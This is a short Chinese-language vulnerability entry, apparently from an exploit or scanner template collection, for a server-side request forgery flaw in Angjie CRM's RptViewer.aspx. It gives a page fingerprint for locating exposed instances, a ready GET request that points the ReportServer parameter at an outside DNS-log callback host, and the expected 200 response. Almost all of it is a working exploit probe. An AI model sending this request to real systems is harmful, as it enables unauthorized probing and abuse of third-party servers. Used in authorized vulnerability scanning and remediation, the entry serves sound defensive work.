# 昂捷CRMRptViewer.aspx存在SSRF漏洞

昂捷 ｜ SSRF ｜ —
- **指纹**：`body="CheckSilverlightInstalled()"`
- **请求**：`GET /WebForms/RptViewer.aspx?ReportServer=http://{{dnslog}}`
- **响应特征**：200